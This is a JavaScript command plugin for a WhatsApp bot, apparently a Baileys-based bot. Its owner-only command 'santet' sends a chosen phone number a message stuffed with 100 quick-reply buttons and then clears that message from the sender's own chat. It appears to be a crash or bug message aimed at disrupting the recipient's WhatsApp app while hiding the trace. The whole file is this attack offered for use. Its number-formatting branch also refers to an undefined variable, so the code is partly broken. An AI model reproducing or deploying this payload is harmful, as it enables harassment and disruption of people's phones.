import db from "../lib/database.js";

let handler = async (m, { conn, text }) => {
	if (!text) return m.reply("No Target");

	let teks = text.replace(/[^0-9]/g, "");
	if (teks.startsWith("08")) {
		teks = target.replace("08", "62");
	}
	const [validTarget] = await conn.onWhatsApp(teks);
	if (validTarget && validTarget.exists) {
		teks = teks + "@s.whatsapp.net";
	} else {
		return m.reply("Number you enter not in whatsapp");
	}
	let _prepare = [];
	for (let i = 0; i < 100; i++) {
		_prepare.push({
			index: i,
			quickReplyButton: {
				displayText: `_${i}_`,
				id: `_${i}_`,
			},
		});
	}
	const _this = await conn.sendMessage(teks, {
		text: "Happy Birthday",
		footer: wm,
		templateButtons: _prepare,
	});
	await conn.chatModify(
		{
			clear: {
				messages: [
					{
						id: _this.key.id,
						fromMe: true,
						timestamp: String(Date.now()),
					},
				],
			},
		},
		teks,
		[]
	);
};
handler.command = ["santet"];
handler.owner = true;
export default handler;
